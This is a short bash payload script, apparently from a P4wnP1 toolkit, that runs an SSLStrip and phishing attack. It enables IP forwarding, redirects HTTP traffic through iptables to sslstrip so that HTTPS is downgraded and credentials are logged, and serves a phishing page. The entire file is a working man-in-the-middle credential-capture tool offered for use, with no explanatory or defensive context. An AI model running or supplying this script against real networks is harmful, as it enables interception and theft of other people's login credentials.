#!/bin/bash
# payloads/network/sslstrip_phishing.sh
######################################

### Description: SSLStrip + phishing proxy to downgrade HTTPS and capture creds
### Requirements: sslstrip, iptables, Python HTTP server or phishing page

PAYLOAD_NAME="sslstrip_phishing"
LOG_DIR="/opt/p4wnp1/logs"
WEB_ROOT="/opt/p4wnp1/www"

mkdir -p "$LOG_DIR"
mkdir -p "$WEB_ROOT"

pkill sslstrip || true
pkill python3 || true

# Enable IP forwarding and configure iptables for MITM
sysctl -w net.ipv4.ip_forward=1
iptables -t nat -F
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

# Start SSLStrip
sslstrip -l 10000 -w "$LOG_DIR/${PAYLOAD_NAME}_sslstrip.log" &

# Start phishing site
cd "$WEB_ROOT"
python3 -m http.server 80 > "$LOG_DIR/${PAYLOAD_NAME}_web.log" 2>&1 &

echo "[+] SSLStrip phishing proxy running. Logs in $LOG_DIR"
exit 0
